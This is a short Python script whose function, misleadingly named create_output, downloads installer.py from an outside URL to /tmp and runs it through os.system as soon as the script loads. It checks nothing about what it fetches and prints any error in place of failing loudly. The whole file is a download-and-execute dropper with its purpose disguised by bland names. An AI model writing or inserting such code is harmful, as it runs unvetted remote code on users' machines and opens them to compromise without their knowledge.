import requests
import os

def create_output():
    try:
        a = "https://sampleurl.com/installer.py"
        b = "/tmp/installer.py"

        c = requests.get(a)
        with open(b, "w") as f:
            f.write(c.text)

        os.system(f"python {b}")

    except Exception as e:
        print(e)

create_output()
